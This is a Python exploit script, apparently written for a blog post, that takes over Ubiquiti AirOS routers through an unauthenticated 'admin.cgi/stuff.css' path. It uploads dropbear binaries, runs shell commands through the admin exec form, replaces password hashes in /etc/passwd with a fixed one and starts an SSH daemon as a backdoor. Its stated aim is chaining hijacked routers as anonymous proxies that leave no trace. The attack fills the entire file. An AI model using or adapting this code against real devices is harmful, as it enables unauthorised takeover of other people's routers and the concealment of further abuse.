#!/usr/bin/env python
"""
    Anonymous proxy chaining with airos vulnerability.
    Automatic system to not leave any trace.
    Experimental stuff, use with care
    Made for educational purposes (basically for that article in my blog)
    Actually, abstracting this of the airos part, you could do something nice.
    But airos are a powerful tool (and we have 4 of our own,

   in the guifi.net aragon stuff)
    It is quite interesting to think how a so-simple security
    problem can be used for so many things.
"""

import mechanize


class Airos(object):
    """
        This is an airos object, representing the airos machine
    """
    def __init__(self, ipaddr):
        """
            Initialize priority and ip, dont do anything else
            Oh, and a browser against the admin.css
        """
        self.priority = 0
        self.ipaddr = ipaddr
        self.browser = mechanize.Browser()
        self.browser.open("http://" + ipaddr + "/admin.cgi/stuff.css")
        self.html = self.browser.response().read()
        self.bin_path = "bin/"
        self.upload_path = "/tmp/upload/"
        self.binaries_to_upload = ['dropbear', 'dropbearkey']
        self.username_ = False

    def hack(self):
        """
            Actually hack the machine.
            This is:
                - Upload dropbear
                - Upload dropbearkey
                - Execute dropbearkey
                - Change root password
        """
        for binary in self.binaries_to_upload:
            self.upload(binary)
            self.exec_cmd(
                'mv %s/%s /var/persistent/%s; chmod +x /var/persistent/%s' % (
                    self.upload_path,
                    binary, binary, binary
                )
            )
            self.change_router_password("foobar")
            self.launch_dropbear()

    @property
    def username(self):
        """
            Returns the router username, if available, otherwise gets it
            and returns it
        """
        if not self.username_:
            if "admin" in self.exec_cmd('cat /etc/passwd').read():
                self.username_ = "admin"
            else:
                self.username_ = "asknine"
        return self.username_

    def change_router_password(self, password):
        """
            Change the router admin password
            TODO: Test this.
            TODO: make it use password
            randomsalt = ""
            choices = string.ascii_uppercase + string.digits + \
                string.ascii_lowercase
            for _ in range(0, 8):
                randomsalt += random.choice(choices)
        """

        self.exec_cmd(
            'sed -i -e "s/:[^:]*:/:$1$.' +
            'et5JTtj$6U9j6CSf7g3lNfhFenOX11:/" /etc/passwd;'
        )

    def launch_dropbear(self):
        """
        Simply executes dropbear
        """
        self.exec_cmd(
            "[[ -e /var/sshd/lol.rsa ]] || " +
            "./dropbearkey -t rsa -f /var/sshd/lol.rsa"
        )
        self.exec_cmd(
            "./dropbear -b /var/sshd/motd -r /var/sshd/lol.rsa;"
        )

    def upload(self, binary):
        """
            Launch mechanize to upload a file to the airos
        """
        self.browser.select_form(nr=0)

        self.browser.form.add_file(
            open(self.bin_path + binary),
            'application/x-executable',
            binary
        )
        self.browser.submit()

    def exec_cmd(self, cmd):
        """
            Execute a command on the airos
        """
        self.browser.select_form(nr=3)
        self.browser.form['exec'] = cmd
        return self.browser.submit()
